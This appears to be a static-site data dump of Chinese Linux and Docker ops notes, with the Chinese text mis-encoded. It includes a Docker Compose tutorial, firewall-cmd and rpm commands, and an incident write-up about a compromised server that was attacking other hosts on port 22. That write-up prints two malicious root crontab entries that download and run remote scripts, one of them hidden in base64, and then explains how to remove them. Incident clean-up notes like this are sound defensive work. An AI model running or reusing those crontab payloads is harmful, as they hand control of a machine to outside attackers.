ä¸ä¼ \n\ndocker push è´¦å·/æ ç­¾åç§°:æ ç­¾çæ¬\n\n\n1\n',charsets:{cjk:!0}},{title:"Linux 22ç«¯å£å¯¹å¤æ»å»è§£å³",frontmatter:{title:"Linux 22ç«¯å£å¯¹å¤æ»å»è§£å³",date:"2023-06-25T09:22:36.000Z",permalink:"/linux/2305",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/04.%E8%BF%90%E7%BB%B4/2300.linux/2305.Linux%2022%E7%AB%AF%E5%8F%A3%E5%AF%B9%E5%A4%96%E6%94%BB%E5%87%BB%E8%A7%A3%E5%86%B3.html",relativePath:"04.è¿ç»´/2300.linux/2305.Linux 22ç«¯å£å¯¹å¤æ»å»è§£å³.md",key:"v-5108785a",path:"/linux/2305/",lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:null,content:'è¿æ¥åäºçæå¡å¨é­åå°æ»å»ï¼æçæ¯ç±äºä¸ç½ç¯å¢ä¸å®å¨ï¼æå¡å¨é¾æ¥ä¿¡æ¯è¢«å«æï¼æ¤å¥çæ¯é ææå¡å¨åè­¦ï¼åè­¦ä¿¡æ¯å¦ä¸ï¼\n\nè­¦å\n\næ¨çè´¦å·ï¼è´¦å· ID: 100016685465ï¼æµç§°ï¼newï¼ä¸çè®¾å¤ï¼IPï¼121.5.146.143ï¼ï¼å­å¨å¯¹å¶ä»æå¡å¨ç«¯å£ï¼TCPï¼22ï¼çæ»å»è¡ä¸ºï¼è¯·æ¨åå¥½å®å¨èªæ¥æ´æ¹ï¼å¹¶å¨ 24 å°æ¶ååæ­¢ä¸è¿°è¡ä¸ºãå¦é¾ææªå¤çï¼æä»¬æ ¸å®åå°æç¸å³æ³å¾æ³è§åè¾è®¯äºæå¡åè®®è¦æ±å¯¹æ¨åæ­¢æå¡ã\n\nä»åè­¦ä¿¡æ¯å¯ä»¥çåºæ¯æä»¬çæå¡å¨å¯¹å¤åèµ·äºæ»å»ï¼åæ¥å¯¹å¤è®¿é®å¾ 22 ç«¯å£è¢«ç¦ç¨ï¼ç¼è§£äºè¿ä¸ªé®é¢ï¼ä½æ¯æ²¡æä»æ ¹æ¬è§£å³ï¼æ¥ä¸æ¥è®°å½ä¸ä¸å¦ä½è§£å³é®é¢ãé¦åä½ çå°å¾èªå·±çæå¡å¨ç¶åµä¸å®æ¯è¿æ ·ç\n\n\n\né¢å¯¹è¿ç¨å ç¨æä»¬å¯ä»¥ kill æï¼ä½è¿æ¯ä¼è¢«éæ°å¯å¨ï¼æä»¥è¿ç§æåµåæ£æ¥æ¯å¦æå®æ¶ä»»å¡\n\n# æ¾ç¤º crontab ä»»å¡ã \ncrontab -l \n# å¦ææéæ³å®æ¶ä»»å¡å é¤ä» \ncrontab -r ä»»å¡\n\n\n1\n2\n3\n4\n\n\nä½æ¯ææ¥çååäºçæå¡æ²¡æä»»ä½å®æ¶æä»¶å¨æ§è¡ï¼é£æä»¬éè¦æ¥ç /etc/crontab æ¯å¦æéæ³å®æ¶ä»»å¡\n\n* * * * * root echo Y3VybCAtZnNTTCBodHRwOi8vMTQwLjk5LjMyLjQ4L2IyZjYyOC9jcm9uYi5zaAo=|base64 -d|bash|bash\n* * * * * root python -c "import urllib2; print urllib2.urlopen(\'http://b.\\\\c\\\\l\\\\u-e\\\\.e\\\\u/t.sh\').read()" >.1;chmod +x .1;./.1                                                                                                                                       \n\n\n1\n2\n\n\nä»¥ä¸åå®¹å¯ä»¥çå°æä¸¤ä¸ªå®æ¶ä»»å¡ä¸ç´åè·ï¼å¶ä¸­ä¸ä¸ªä¸ç´å¨ä¸è½½æä»¶å¹¶ä¸æ§è¡ï¼æ­¤æ¶æä»¬å¹²æè¿ä¸¤ä¸ªä»»å¡ï¼æå¨æ³¨æè¿ä¸¤ä¸ªä»»å¡æç¤ºæ\n\næ³¨æ\n\n/etc/crontab" E514: write error (file system full?) ç³»ç»æä»¶å·²æ»¡\n\næ­¤æ¶éè¦å é¤ä¸äºæä»¶éæ¾ç©ºé´ä»¥å¯¹ä»¥ä¸åå®¹è¿è¡ä¿å­\n\n# æ¥çåªä¸ªæä»¶å ç¨è¾å¤§å¯ä»¥å æ\ndu -sh æä»¶\n\n\n1\n2\n\n\nä»¥ä¸å®æåï¼éæ°å¯å¨å®æ¶ä»»å¡\n\nsystemctl restart crond.service\n\n\n1\n\n\næ¾å°è¿ç¨æå¨æä»¶ï¼å é¤æä»¶ï¼åæ­¢è¿ç¨\n\nps -ef | grep 18732\n\n\n1\n\n\nä»¥ä¸æä½ä¸æ¥å¦æè¿æé®é¢ï¼é£ä¹å¯è½éè¦ææ¥æè¿è¡çæå¡æ¯å¦æå¼å¸¸ï¼æ¯å¦ docker æ¯å¦æéå¤å®¹å¨è¢«å¯å¨ç­',normalizedContent:'è¿æ¥åäºçæå¡å¨é­åå°æ»å»ï¼æçæ¯ç±äºä¸ç½ç¯å¢ä¸å®å¨ï¼æå¡å¨é¾æ¥ä¿¡æ¯è¢«å«æï¼æ¤å¥çæ¯é ææå¡å¨åè­¦ï¼åè­¦ä¿¡æ¯å¦ä¸ï¼\n\nè­¦å\n\næ¨çè´¦å·ï¼è´¦å· id: 100016685465ï¼æµç§°ï¼newï¼ä¸çè®¾å¤ï¼ipï¼121.5.146.143ï¼ï¼å­å¨å¯¹å¶ä»æå¡å¨ç«¯å£ï¼tcpï¼22ï¼çæ»å»è¡ä¸ºï¼è¯·æ¨åå¥½å®å¨èªæ¥æ´æ¹ï¼å¹¶å¨ 24 å°æ¶ååæ­¢ä¸è¿°è¡ä¸ºãå¦é¾ææªå¤çï¼æä»¬æ ¸å®åå°æç¸å³æ³å¾æ³è§åè¾è®¯äºæå¡åè®®è¦æ±å¯¹æ¨åæ­¢æå¡ã\n\nä»åè­¦ä¿¡æ¯å¯ä»¥çåºæ¯æä»¬çæå¡å¨å¯¹å¤åèµ·äºæ»å»ï¼åæ¥å¯¹å¤è®¿é®å¾ 22 ç«¯å£è¢«ç¦ç¨ï¼ç¼è§£äºè¿ä¸ªé®é¢ï¼ä½æ¯æ²¡æä»æ ¹æ¬è§£å³ï¼æ¥ä¸æ¥è®°å½ä¸ä¸å¦ä½è§£å³é®é¢ãé¦åä½ çå°å¾èªå·±çæå¡å¨ç¶åµä¸å®æ¯è¿æ ·ç\n\n\n\né¢å¯¹è¿ç¨å ç¨æä»¬å¯ä»¥ kill æï¼ä½è¿æ¯ä¼è¢«éæ°å¯å¨ï¼æä»¥è¿ç§æåµåæ£æ¥æ¯å¦æå®æ¶ä»»å¡\n\n# æ¾ç¤º crontab ä»»å¡ã \ncrontab -l \n# å¦ææéæ³å®æ¶ä»»å¡å é¤ä» \ncrontab -r ä»»å¡\n\n\n1\n2\n3\n4\n\n\nä½æ¯ææ¥çååäºçæå¡æ²¡æä»»ä½å®æ¶æä»¶å¨æ§è¡ï¼é£æä»¬éè¦æ¥ç /etc/crontab æ¯å¦æéæ³å®æ¶ä»»å¡\n\n* * * * * root echo y3vybcatznnttcbodhrwoi8vmtqwljk5ljmyljq4l2iyzjyyoc9jcm9uyi5zaao=|base64 -d|bash|bash\n* * * * * root python -c "import urllib2; print urllib2.urlopen(\'http://b.\\\\c\\\\l\\\\u-e\\\\.e\\\\u/t.sh\').read()" >.1;chmod +x .1;./.1                                                                                                                                       \n\n\n1\n2\n\n\nä»¥ä¸åå®¹å¯ä»¥çå°æä¸¤ä¸ªå®æ¶ä»»å¡ä¸ç´åè·ï¼å¶ä¸­ä¸ä¸ªä¸ç´å¨ä¸è½½æä»¶å¹¶ä¸æ§è¡ï¼æ­¤æ¶æä»¬å¹²æè¿ä¸¤ä¸ªä»»å¡ï¼æå¨æ³¨æè¿ä¸¤ä¸ªä»»å¡æç¤ºæ\n\næ³¨æ\n\n/etc/crontab" e514: write error (file system full?) ç³»ç»æä»¶å·²æ»¡\n\næ­¤æ¶éè¦å é¤ä¸äºæä»¶éæ¾ç©ºé´ä»¥å¯¹ä»¥ä¸åå®¹è¿è¡ä¿å­\n\n# æ¥çåªä¸ªæä»¶å ç¨è¾å¤§å¯ä»¥å æ\ndu -sh æä»¶\n\n\n1\n2\n\n\nä»¥ä¸å®æåï¼éæ°å¯å¨å®æ¶ä»»å¡\n\nsystemctl restart crond.service\n\n\n1\n\n\næ¾å°è¿ç¨æå¨æä»¶ï¼å é¤æä»¶ï¼åæ­¢è¿ç¨\n\nps -ef | grep 18732\n\n\n1\n\n\nä»¥ä¸æä½ä¸æ¥å¦æè¿æé®é¢ï¼é£ä¹å¯è½éè¦ææ¥æè¿è¡çæå¡æ¯å¦æå¼å¸¸ï¼æ¯å¦ docker æ¯å¦æéå¤å®¹å¨è¢«å¯å¨ç­',charsets:{cjk:!0}},{title:"Linux å½ä»¤æ»ç»",frontmatter:{title:"Linux å½ä»¤æ»ç»",date:"2023-06-25T09:22:36.000Z",permalink:"/linux/2304",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/04.%E8%BF%90%E7%BB%B4/2300.linux/2304.Linux%20%E5%91%BD%E4%BB%A4%E6%80%BB%E7%BB%93.html",relativePath:"04.è¿ç»´/2300.linux/2304.Linux å½ä»¤æ»ç».md",key:"v-52c117a4",path:"/linux/2304/",headers:[{level:2,title:"rpm",slug:"rpm",normalizedTitle:"rpm",charIndex:2},{level:2,title:"firewall",slug:"firewall",normalizedTitle:"firewall",charIndex:330}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"rpm firewall",content:'# rpm\n\nå¨ Linux ç³»ç»ä¸­ï¼RPMï¼Red Hat Package Managerï¼æ¯ä¸ç§å¸¸è§çè½¯ä»¶åç®¡çå¨ï¼æä¾äºæ¹ä¾¿çè½¯ä»¶å®è£ãåçº§åå¸è½½åè½ãæ¬æå°è¯¦ç»ä»ç» rpm çè¯­æ³ãå®æååç§æ¹æ³ä¹é´çåºå«åéç¹åå®¹ã\n\n# å®è£\nrpm -ivh xxx.rpm\n\n# å¯ä»¥æ¥è¯¢å°rpmåçåå­\nrpm -q <å³é®å­>\n\n# å é¤ç¹å®rpmå\nrpm -e <åçåå­>\n\n# ä¸æ£æ¥ä¾èµï¼ç´æ¥å é¤rpmå\nrpm -e --nodeps <åçåå­>\n\n# å é¤ææç¸ååå­çåï¼ å¹¶å¿½ç¥ä¾èµ\nrpm -e --allmatches --nodeps <åçåå­>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n\n# firewall\n\nfirewall æ¯ CentOS 7 çæ¬åçèªå¸¦é²ç«å¢ç®¡çå·¥å·ï¼ä¸ iptables ä¸åï¼firewall æ¯ä¸æ¬¾å¨æé²ç«å¢ç®¡çå·¥å·ãæè°å¨æé²ç«å¢ï¼æ¯æ firewall å¨è¿è¡æ¶ï¼ä»»ä½è§åçåæ´é½ä¸éè¦å¯¹é²ç«å¢è§ååè¡¨è¿è¡éæ°å è½½ï¼åªéè¦å°åæ´é¨åä¿å­å¹¶æ´æ°è¿è¡å³å¯ãç¸å¯¹åºçï¼å½ç¨æ·ä½¿ç¨ iptables æ·»å è§åæ¶ï¼å¦ææ³è¦è®©è§åæ°¸ä¹ä¿å­ï¼éè¦æ§è¡å½ä»¤ serivce iptables saveï¼æ³¨ï¼è¯¥å½ä»¤çæ§è¡éè¦å®è£ iptables.serivcesï¼ï¼æå¯ä»¥æ°¸ä¹ä¿å­ç½®éç½®æä»¶ä¸­ï¼å¹¶ä¸å¨éå¯åï¼éç½®ä¾æ§å­å¨ãå¨æ´ä¸ªè¿ç¨ä¸­ï¼iptables ä¼å¯¹é²ç«å¢çè§ååè¡¨éè¯»ä¸éï¼å è½½å°åæ ¸ã\n\næ·»å èå´ç«¯å£ å¦ 5000-10000ï¼\n\nfirewall-cmd --zone=public --add-port=5000-10000/tcp --permanent \n\n\n1\n\n\néæ°è½½å¥\n\nfirewall-cmd --reload\n\n\n1\n\n\næ¥ç\n\nfirewall-cmd --zone=public --query-port=80/tcp\n\n\n1\n\n\nå é¤\n\nfirewall-cmd --zone=public --remove-port=80/tcp --permanent\n\n\n1\n\n\n# ä½å¦æä½ éè¦å¼å¯ firewalldï¼é£ä¹è¯·æ¥çå¦ä¸éç½®\n# åè®¸22ç«¯å£è®¿é®\nfirewall-cmd --zone=public --add-port=22/tcp --permanen\n# éæ°è½½å¥ä¸ä¸é²ç«å¢è®¾ç½®ï¼ä½¿è®¾ç½®çæ\nfirewall-cmd --reload\n# å¯éè¿å¦ä¸å½ä»¤æ¥çæ¯å¦çæ\nfirewall-cmd --zone=public --query-port=22/tcp\n# æ¥çå½åç³»ç»æå¼çææç«¯å£\nfirewall-cmd --zone=public --list-ports\n# å³æååæå¼ç22ç«¯å£\nfirewall-cmd --zone=public --remove-port=22/tcp --permanent\n# æ¹éå¼æ¾ç«¯å£ï¼å¦ä»100å°500è¿ä¹é´çç«¯å£æä»¬å¨é¨è¦æå¼\nfirewall-cmd --zone=public --add-port=100-500/tcp --permanent\n# éå¶IPä¸º192.168.0.200çå°åç¦æ­¢è®¿é®80ç«¯å£å³ç¦æ­¢è®¿é®æºå¨\nfirewall-cmd --permanent --add-rich-rule="rule family="ipv4" source address="192.168.0.200" port protocol="tcp" port="80" reject"\n# è§£é¤åæè¢«éå¶ç192.168.0.200\nfirewall-cmd --permanent --add-rich-rule="rule family="ipv4" source address="192.168.0.200" port protocol="tcp" port="80" accept"\n# éå¶10.0.0.0-10.0.0.255è¿ä¸æ´ä¸ªæ®µçIPï¼ç¦æ­¢ä»ä»¬è®¿é®\nfirewall-cmd --permanent --add-rich-rule="rule family="ipv4" source address="10.0.0.0/24" port protocol="tcp" port="80" reject"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n',normalizedContent:'# rpm\n\nå¨ linux ç³»ç»ä¸­ï¼rpmï¼red hat package managerï¼æ¯ä¸ç§å¸¸è§çè½¯ä»¶åç®¡çå¨ï¼æä¾äºæ¹ä¾¿çè½¯ä»¶å®è£ãåçº§åå¸è½½åè½ãæ¬æå°è¯¦ç»ä»ç» rpm çè¯­æ³ãå®æååç§æ¹æ³ä¹é´çåºå«åéç¹åå®¹ã\n\n# å®è£\nrpm -ivh xxx.rpm\n\n# å¯ä»¥æ¥è¯¢å°rpmåçåå­\nrpm -q <å³é®å­>\n\n# å é¤ç¹å®rpmå\nrpm -e <åçåå­>\n\n# ä¸æ£æ¥ä¾èµï¼ç´æ¥å é¤rpmå\nrpm -e --nodeps <åçåå­>\n\n# å é¤ææç¸ååå­çåï¼ å¹¶å¿½ç¥ä¾èµ\nrpm -e --allmatches --nodeps <åçåå­>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n\n# firewall\n\nfirewall æ¯ centos 7 çæ¬åçèªå¸¦é²ç«å¢ç®¡çå·¥å·ï¼ä¸ iptables ä¸åï¼firewall æ¯ä¸æ¬¾å¨æé²ç«å¢ç®¡çå·¥å·ãæè°å¨æé²ç«å¢ï¼æ¯æ firewall å¨è¿è¡æ¶ï¼ä»»ä½è§åçåæ´é½ä¸éè¦å¯¹é²ç«å¢è§ååè¡¨è¿è¡éæ°å è½½ï¼åªéè¦å°åæ´é¨åä¿å­å¹¶æ´æ°è¿è¡å³å¯ãç¸å¯¹åºçï¼å½ç¨æ·ä½¿ç¨ iptables æ·»å è§åæ¶ï¼å¦ææ³è¦è®©è§åæ°¸ä¹ä¿å­ï¼éè¦æ§è¡å½ä»¤ serivce iptables saveï¼æ³¨ï¼è¯¥å½ä»¤çæ§è¡éè¦å®è£ iptables.serivcesï¼ï¼æå¯ä»¥æ°¸ä¹ä¿å­ç½®éç½®æä»¶ä¸­ï¼å¹¶ä¸å¨éå¯åï¼éç½®ä¾æ§å­å¨ãå¨æ´ä¸ªè¿ç¨ä¸­ï¼iptables ä¼å¯¹é²ç«å¢çè§ååè¡¨éè¯»ä¸éï¼å è½½å°åæ ¸ã\n\næ·»å èå´ç«¯å£ å¦ 5000-10000ï¼\n\nfirewall-cmd --zone=public --add-port=5000-10000/tcp --permanent \n\n\n1\n\n\néæ°è½½å¥\n\nfirewall-cmd --reload\n\n\n1\n\n\næ¥ç\n\nfirewall-cmd --zone=public --query-port=80/tcp\n\n\n1\n\n\nå é¤\n\nfirewall-cmd --zone=public --remove-port=80/tcp --permanent\n\n\n1\n\n\n# ä½å¦æä½ éè¦å¼å¯ firewalldï¼é£ä¹è¯·æ¥çå¦ä¸éç½®\n# åè®¸22ç«¯å£è®¿é®\nfirewall-cmd --zone=public --add-port=22/tcp --permanen\n# éæ°è½½å¥ä¸ä¸é²ç«å¢è®¾ç½®ï¼ä½¿è®¾ç½®çæ\nfirewall-cmd --reload\n# å¯éè¿å¦ä¸å½ä»¤æ¥çæ¯å¦çæ\nfirewall-cmd --zone=public --query-port=22/tcp\n# æ¥çå½åç³»ç»æå¼çææç«¯å£\nfirewall-cmd --zone=public --list-ports\n# å³æååæå¼ç22ç«¯å£\nfirewall-cmd --zone=public --remove-port=22/tcp --permanent\n# æ¹éå¼æ¾ç«¯å£ï¼å¦ä»100å°500è¿ä¹é´çç«¯å£æä»¬å¨é¨è¦æå¼\nfirewall-cmd --zone=public --add-port=100-500/tcp --permanent\n# éå¶ipä¸º192.168.0.200çå°åç¦æ­¢è®¿é®80ç«¯å£å³ç¦æ­¢è®¿é®æºå¨\nfirewall-cmd --permanent --add-rich-rule="rule family="ipv4" source address="192.168.0.200" port protocol="tcp" port="80" reject"\n# è§£é¤åæè¢«éå¶ç192.168.0.200\nfirewall-cmd --permanent --add-rich-rule="rule family="ipv4" source address="192.168.0.200" port protocol="tcp" port="80" accept"\n# éå¶10.0.0.0-10.0.0.255è¿ä¸æ´ä¸ªæ®µçipï¼ç¦æ­¢ä»ä»¬è®¿é®\nfirewall-cmd --permanent --add-rich-rule="rule family="ipv4" source address="10.0.0.0/24" port protocol="tcp" port="80" reject"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n',charsets:{cjk:!0}},{title:"Docker-Compose å½ä»¤ååºæ¬ä½¿ç¨",frontmatter:{title:"Docker-Compose å½ä»¤ååºæ¬ä½¿ç¨",date:"2023-06-25T09:22:36.000Z",permalink:"/docker/401",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/04.%E8%BF%90%E7%BB%B4/40.Docker/401.Docker-Compose%20%E5%91%BD%E4%BB%A4%E5%8F%8A%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8.html",relativePath:"04.è¿ç»´/40.Docker/401.Docker-Compose å½ä»¤ååºæ¬ä½¿ç¨.md",key:"v-5e7029de",path:"/docker/401/",headers:[{level:2,title:"ç®ä»",slug:"ç®ä»",normalizedTitle:"ç®ä»",charIndex:2},{level:2,title:"å®è£ä¸å¸è½½",slug:"å®è£ä¸å¸è½½",normalizedTitle:"å®è£ä¸å¸è½½",charIndex:638},{level:2,title:"å½ä»¤",slug:"å½ä»¤",normalizedTitle:"å½ä»¤",charIndex:503},{level:2,title:"Composeæä»¶ç¼å",slug:"composeæä»¶ç¼å",normalizedTitle:"compose æä»¶ç¼å",charIndex:1790},{level:3,title:"ç¤ºä¾1",slug:"ç¤ºä¾1",normalizedTitle:"ç¤ºä¾ 1",charIndex:1807},{level:3,title:"ç¤ºä¾2",slug:"ç¤ºä¾2",normalizedTitle:"ç¤ºä¾ 2",charIndex:3203},{level:3,title:"Compose æä»¤",slug:"compose-æä»¤",normalizedTitle:"compose æä»¤",charIndex:5784},{level:3,title:"å½ä»¤éé¡¹",slug:"å½ä»¤éé¡¹",normalizedTitle:"å½ä»¤éé¡¹",charIndex:5952},{level:3,title:"å½ä»¤ä½¿ç¨è¯´æ",slug:"å½ä»¤ä½¿ç¨è¯´æ",normalizedTitle:"å½ä»¤ä½¿ç¨è¯´æ",charIndex:6176},{level:4,title:"up",slug:"up",normalizedTitle:"up",charIndex:2309},{level:4,title:"down",slug:"down",normalizedTitle:"down",charIndex:809},{level:4,title:"exec",slug:"exec",normalizedTitle:"exec",charIndex:6686},{level:4,title:"ps",slug:"ps",normalizedTitle:"ps",charIndex:769},{level:4,title:"restart",slug:"restart",normalizedTitle:"restart",charIndex:6824},{level:4,title:"rm",slug:"rm",normalizedTitle:"rm",charIndex:6925},{level:4,title:"start",slug:"start",normalizedTitle:"start",charIndex:6826},{level:4,title:"stop",slug:"stop",normalizedTitle:"stop",charIndex:7013},{level:4,title:"top",slug:"top",normalizedTitle:"top",charIndex:666},{level:4,title:"pause,unpause",slug:"pause-unpause",normalizedTitle:"pause,unpause",charIndex:7337},{level:4,title:"logs",slug:"logs",normalizedTitle:"logs",charIndex:7464}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"ç®ä» å®è£ä¸å¸è½½ å½ä»¤ Composeæä»¶ç¼å ç¤ºä¾1 ç¤ºä¾2 Compose æä»¤ å½ä»¤éé¡¹ å½ä»¤ä½¿ç¨è¯´æ up down exec ps restart rm start stop top pause,unpause logs",content:'# ç®ä»\n\nCompose é¡¹ç®æ¯ Docker å®æ¹çå¼æºé¡¹ç®ï¼è´è´£å®ç°å¯¹ Docker å®¹å¨éç¾¤çå¿«éç¼æï¼å¸®å©å®ä¹åè¿è¡å¤ä¸ª Docker å®¹å¨çåºç¨ï¼å¶åèº«æ¯å¼æºé¡¹ç® Figãæè°ç¼æå°±æ¯è½æä¸ä¸ªé¡¹ç®çä¾èµï¼å¦ mysqlï¼redisï¼æå¡é´çä¾èµç­ï¼æç§æåºçæ¹å¼å¯å¨å®¹å¨\n\nDockerFile å¯ä»¥è®©ç¨æ·å¾æ¹ä¾¿çå®ä¹ä¸ä¸ªåç¬çåºç¨å®¹å¨ï¼ç¶èå¨æ¥å¸¸å·¥ä½ä¸­ä»¬ç»å¸¸ä¼ç¢°å°éè¦å¤ä¸ªå®¹å¨ç¸äºéåæ¥å®ææé¡¹ä»»å¡çæåµãä¾å¦è¦å®ç°ä¸ä¸ª web é¡¹ç®ï¼é¤äº web æå¡å®¹å¨æ¬èº«ï¼å¾å¾è¿éè¦åå ä¸åç«¯çæ°æ®åºæå¡å¨å®¹å¨ï¼çè³è¿åæ¬è´è½½åè¡¡å®¹å¨ç­ã\n\nCompose æ°å¥½æ»¡è¶³äºè¿æ ·çéæ±ï¼å®åè®¸éè¿ä¸ä¸ªåç¬ç docker-compose.yml æ¨¡æ¿æä»¶ï¼æ¥å®ä¹ä¸ç»ç¸å³èçåºç¨å®¹å¨ä¸ºä¸ä¸ªé¡¹ç®ã\n\nCompose ä¸­æä¸¤ä¸ªéè¦çæ¦å¿µ\n\n 1. æå¡ï¼serviceï¼ï¼ä¸ä¸ªåºç¨çå®¹å¨ï¼å®éä¸å¯ä»¥åæ¬è¥å¹²è¿è¡ç¸åéåçå®¹å¨å®ä¾ã\n 2. é¡¹ç®ï¼projectï¼ï¼ç±ä¸ç»å³èçåºç¨å®¹å¨ç»æçä¸ä¸ªå®æ´ä¸å¡ååï¼å docker-compose.yml æä»¶ä¸­å®ä¹ã\n\nCompose çé»è®¤ç®¡çå¯¹è±¡æ¯é¡¹ç®ï¼éè¿å­å½ä»¤å¯¹é¡¹ç®ä¸­çä¸ç»å®¹å¨è¿è¡ä¾¿æ·å°çå½å¨æç®¡çã\n\nCompose é¡¹ç®ç± Python ç¼åï¼å®ç°ä¸è°ç¨äº Docker æå¡æä¾ç API æ¥å¯¹å®¹å¨è¿è¡ç®¡çãå æ­¤ï¼åªè¦ææä½çå¹³å°æ¯æ Docker APIï¼å°±å¯ä»¥åå¶ä¸å©ç¨ Compose æ¥è¿è¡ç¼æç®¡çã\n\n\n# å®è£ä¸å¸è½½\n\nå®è£çè¯ï¼å¯ä»¥å®è£ Docker Desktop ï¼å®åå«äº Docker ä»¥å Compose å K8sï¼ä¹å¯ä»¥åç¬å®è£ï¼ä½å»ºè®®åäºè§£æ¸æ¥å®æ¹å¯¹ Compose çä¸äºå®è£éå¶ãå®æ¹å°å\n\nlinux å®è£\n\nsudo curl -L "https://github.com/docker/compose/releases/download/1.29.2/docker-compose-$(uname -s)-$(uname -m)" -o /usr/local/bin/docker-compose\nsudo chmod +x /usr/local/bin/docker-compose\ndocker-compose --version\n\n\n1\n2\n3\n\n\n\n# å½ä»¤\n\nå½ä»¤            æè¿°\nversion       çæ¬ç®å 4 ä»¥ä¸çé½å¯ä»¥åï¼å¦ 3.9ï¼3.8 ç­ï¼æå¥½ä¿æå docker çæ¬å¼å®¹\nservices      å¯ä»¥éé¢æè¿°ä½ çæææå¡ï¼ä»¥åä¾èµå³ç³»ç­\nimage         æå®ä¸ºéååç§°æéå IDï¼å¦æéåå¨æ¬å°ä¸å­å¨ï¼Compose å°ä¼å°è¯æåè¿ä¸ªéå\nports         æå®ä¸å®¿ä¸»æºä¸å®¹å¨æ å°çç«¯å£ï¼æ¯ä¸ä¸ªæ°ç»ï¼æ¯ä¸ªæ°ç»çåç´ å»ºè®®ç¨å­ç¬¦å½¢å¼ï¼å¦ "80:80"\nvolumes       æè½½è·¯å¾è®¾ç½®ï¼ç±»åä¸ºæ°ç»ï¼å¯ä»¥æè½½å¤ä¸ªï¼å¨å¶ä½å®¹å¨çæ¶åå¯ä»¥æ¾ç¤ºçå£°ææè½½è·¯å¾ï¼ä¹å¯ä»¥å¨å®¹å¨è¿è¡æ¶ç´æ¥ä½¿ç¨ -v å½ä»¤ã\nnetworks      éç½®å®¹å¨è¿æ¥çç½ç» docker network ls æ¥çç½ç»åè¡¨ï¼ docker network inspect\n              <container id> å¯ä»¥æ¥çå¯¹åºç½ç»çéç½®\nenvironment   è®¾ç½®ç¯å¢åéãä½ å¯ä»¥ä½¿ç¨æ°ç»æå­å¸ä¸¤ç§æ¹å¼\nenv_file      ä»æä»¶ä¸­è·åç¯å¢åéï¼å¯ä»¥ä¸ºåç¬çæä»¶è·¯å¾æåè¡¨ï¼æä»¶åå¿é¡»æ¯å­å¸æ¹å¼ç¼å\ncommand       è¦çå®¹å¨å¯å¨åé»è®¤æ§è¡çå½ä»¤\ndepends_on    è§£å³å®¹å¨çä¾èµãå¯å¨ååçé®é¢ï¼å¡«åçå¼ä¸º æå¡åï¼ä¼ç­ä¾èµçæå¡å¯å¨ä¸å®ç¨åº¦æå¯å¨èªå·±\nhealthcheck   éè¿å½ä»¤æ£æ¥å®¹å¨æ¯å¦çæ§è¿è¡\nsysctls       éç½®å®¹å¨åæ ¸åæ°ï¼å¦ ES ç­é½éè¦ä¿®æ¹åæ ¸çç¯å¢åæ°\nulimits       æå®å®¹å¨ç ulimits éå¶å¼ï¼å¦ ESãClickhouse ä¼æä¿®æ¹éæ±\nbuild         ç¨æ¥å°æå® Dockerfile æåæå¯¹åºéåï¼ç¶ååè¿è¡è¯¥éå\n\nè¿äºå½ä»¤å¶å®å°±ç±»ä¼¼äºæä»¬å¨ Docker ä¸­å¯å¨ä¸ä¸ªå®¹å¨çå½ä»¤ã\n\n\n# Compose æä»¶ç¼å\n\n\n# ç¤ºä¾ 1\n\n### çæ¬\nversion: "3.2"\n\nservices:\n  ### æå¡åç§°\n  tomcat:\n    ### æå®å®¹å¨çåç§° ç¸å½äº --name\n    container_name: tomcat_1\n    ### ä½¿ç¨åªä¸ªéå ç¸å½äº docket run image\n    image: tomcat:8.0-jre8\n    ### æå®å®¿ä¸»æºä¸å®¹å¨ç«¯å£çæ å° ç¸å½äº -p\n    ports:\n      ### å®¿ä¸»æº:å®¹å¨\n      - "8080:8080"\n    ### å®¿ä¸»æºä¸å®¹å¨çæ°æ®å±äº« æè½½ç®å½ ç¸å½äº -v\n    volumes:\n      ### æ¹å¼1ï¼æå®ç»å¯¹æç¡®(ç»å¯¹è·¯å¾)çæè½½ç®å½\n      - /home/server:/user\n      ### æ¹å¼2ï¼å£°æäºèªå®åå»ºå·åçåé\n      - tomcatwebapps:/user\n    ### ä»£è¡¨å½åæå¡å¤äºé£ä¸ªç½ç»ï¼ä½ç¨æ¯ç½ç»éç¦»ç¨ï¼ä¼æç¸ç½ç»åç§°ç¸åçå®¹å¨çç½æ®µç»ä¸ãç¸å½äº --network\n    networks:\n      - group1\n\n  mysql:\n    image: mysql:5.7.32\n    container_name: mysql\n    ports:\n    - "3306:3306"\n    volumes:\n    - mysqldata:/var/lib/mysql\n    - mysqlconf:/etc/mysql\n    environment:\n      -MYSQL_ROOT_PASSWORD=root\n    networks:\n      group1\n\n\n### æè¿° æå¨å·éçåé\nvolumes:\n  ### æå®åé tomcatwebappsï¼å¦æä¸å externalï¼é»è®¤ä¼æ¯ docker-compose.yml æå¨å½åæä»¶å¤¹çåç§°(ä¼èªå¨åå»º)\n  tomcatwebapps:\n    ### ä½¿ç¨èªå®ä¹å·æ¯\n    external:\n      ### true ç¡®å®ä½¿ç¨æå®å·åï¼æ³¨æï¼ä¸æ¦ä½¿ç¨å¤é¨èªå®ä¹å·åï¼å¯å¨æå¡ä¹åå¿é¡»æå¨åå»º docker volume create å·å\n      false\n  mysqldata:\n  mysqlconf:\n\n### å®ä¹æå¡ç¨å°çç½ç»\nnetworks:\n  ### å®ä¹ä¸é¢çæå¡ç¨å°çç½ç»çåç§°ï¼é»è®¤æ¯é©±å¨å±äº bridgeï¼èªå®ä¹çç½ç»åç§° group1ï¼å¨å®éä¸­ä¼åä¸º é¡¹ç®å(ææå¨æä»¶ç®å½å)\n  group1:\n    ### ä½¿ç¨å¤é¨æå®çç½ç»ï¼ä¸º true å°±æ è¯ç½ç»å¿é¡»å­å¨\n    external:\n      ### docker network create -d bridge ç½ç»åç§°\n      